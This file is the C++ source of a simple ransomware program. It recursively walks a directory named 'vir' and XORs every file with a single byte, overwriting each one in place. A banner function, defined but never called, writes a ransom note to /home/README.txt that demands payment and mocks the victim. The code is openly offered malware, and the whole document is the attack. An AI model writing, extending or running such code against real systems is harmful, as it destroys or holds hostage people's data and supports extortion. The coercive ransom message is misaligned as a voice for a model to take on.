#include <boost/filesystem/directory.hpp>
#include <iostream>
#include <fstream>
#include <dirent.h>
#include <vector>
#include <string>
#include <sys/stat.h>
#include <filesystem>
#include <boost/filesystem.hpp>
#include <stdio.h>
//#define BUFF_SIZE (1024 * 1024) * 1000
using namespace std; using boost::filesystem::recursive_directory_iterator;
//declare function
int enc_dec(string path);
void banner();
//main driver
int main(){
    
    string path = "vir"; //path of directory to (encrypt / decrypt) files
    for (auto &file : recursive_directory_iterator(path)){
        cout << file.path() << endl;
        enc_dec(file.path().c_str());
    }

    return 0;
}


//function for encrypt and decrypt content of files
int enc_dec(string path){
    ifstream file;
    file.open(path);
    char c;
    string s;
    while (file.get(c)){
        s += c ^ 0x60;
    }
    file.close();
    
    // ---------------------------------------------------

    ofstream file2;
    file2.open(path);
    for (int i = 0; i < s.size(); i++){
        file2.put( s[i] );
    }
    file2.close();

    return 0;

}

void banner(){
    ofstream bannerfile;
    bannerfile.open("/home/README.txt");
    bannerfile << "Hello Sir..."\
        "All data in your PC is encrypted!!!!!!!!!!!!!!!\n"\
        "BLAME YOURSELF AND OBEY: you must send a ransom to me\nHAHAHAHAHA you are a crazy man :D\n";
    bannerfile.close();


}
